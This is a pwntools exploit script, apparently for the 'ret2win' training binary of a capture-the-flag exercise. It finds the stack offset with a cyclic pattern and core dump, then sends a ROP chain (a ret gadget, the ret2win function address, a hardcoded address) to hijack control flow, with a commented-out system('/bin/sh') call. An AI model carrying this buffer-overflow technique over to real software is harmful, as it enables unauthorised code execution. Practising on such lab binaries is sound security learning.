import sys

from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
# init-peda
# break
# b *0x080491aa
# b *0x0000000000400749
b *0x0000000000400755
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
# context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

if False:
    io = start()
    io.sendline(cyclic(400, n=8))

    io.wait_for_close()
    core =io.corefile

    print(core.sp)
    print(core.sp)
    print(core.sp)
    print(core.sp)
    print(hex(core.sp))
    print(core.read(core.sp, 8))
    info("-----------------------")
    info("%s", cyclic_find(core.read(core.sp, 8), n=8))
    info("-----------------------")

    sys.exit()

offset=40


binsh_offset = next(elf.libc.search(b'/bin/sh\x00'))

rop = ROP(elf)
rop.search
# rop.call(elf.plt.puts, [binsh_offset, ])
# rop.call(elf.plt.system, [binsh_offset, ])

# info("%s", rop.dump())
# sys.exit()

PAYLOAD = flat({
    offset: [
      rop.find_gadget(['ret']).address,  # ropper --file ./ret2win --search 'ret'
      elf.symbols.ret2win,
      0x004006e1,
    ]
})


io = start()
io.sendlineafter(b'>', PAYLOAD)
io.clean()
# io.interactive()
io.wait_for_close()
